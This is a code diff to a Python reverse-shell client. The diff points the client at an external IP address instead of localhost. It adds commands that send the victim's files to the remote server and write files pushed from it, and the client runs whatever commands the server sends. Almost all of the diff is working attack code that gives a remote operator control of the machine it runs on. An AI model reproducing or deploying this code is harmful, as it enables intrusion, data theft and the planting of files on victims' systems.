@@ -7,7 +7,7 @@ s = socket.socket() # client computer can connect to others
 
 # ip address of server
 # spin up the server with `nc -l localhost 4444``
-host = "localhost"
+host = "129.21.49.61"
 port = 4444
 
 # open a socket to the server
@@ -23,9 +23,6 @@ signal.signal(signal.SIGTERM, closeServer)
 
 # infinite loop for continuous listening for server's commands
 while True:
-  # send the current working directory so it looks like a real shell
-  s.send(str.encode(str(os.getcwd()) + '> '))
-
   # get the command input from server
   data = s.recv(1024)
 
@@ -37,9 +34,31 @@ while True:
   # the `cd` command is special, we need to change python's context
   if data[:2].decode("utf-8") == 'cd':
     try:
-      os.chdir(data[3:].decode("utf-8"))
+      os.chdir(data[3:].decode("utf-8")) # the -1 removes the \n from the end of the line
+      s.send(str.encode(os.getcwd()))
     except FileNotFoundError:
       s.send(str.encode("Dir does not exist"))
+    continue
+
+  if data[:2].decode("utf-8") == 'DL':
+    with open(data[3:].decode("utf-8"), "rb") as file:
+      data = file.read(1024)
+      while data:
+        s.send(data)
+        resp = str(s.recv(1024),"utf-8")
+        data = file.read(1024)
+      s.send(str.encode("DONE"))
+    continue
+
+  if data[:2].decode("utf-8") == 'UP':
+    with open(data[3:].decode("utf-8"), "ab") as file:
+      s.send(str.encode("READY"))
+      data = s.recv(1024)
+      while data != b'DONE':
+        file.write(data)
+        s.send(str.encode("ACK"))
+        data = s.recv(1024)
+      s.send(str.encode("DONE"))
     continue
 
   # check if there are actually data/commands received (that is not cd)
